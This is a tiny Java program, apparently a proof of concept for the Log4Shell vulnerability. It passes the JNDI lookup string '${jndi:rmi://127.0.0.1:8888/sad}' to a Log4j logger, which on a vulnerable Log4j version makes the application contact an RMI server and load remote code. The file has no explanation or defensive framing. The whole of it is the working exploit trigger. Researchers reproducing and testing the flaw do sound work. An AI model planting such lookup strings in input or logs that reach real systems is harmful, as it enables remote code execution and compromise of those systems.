package com.test;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Cliet {
    private static Logger logger=LogManager.getLogger(Cliet.class);
    public static void main(String[] args) {
        String s ="${jndi:rmi://127.0.0.1:8888/sad}";
        logger.error("{}",s);
    }
}
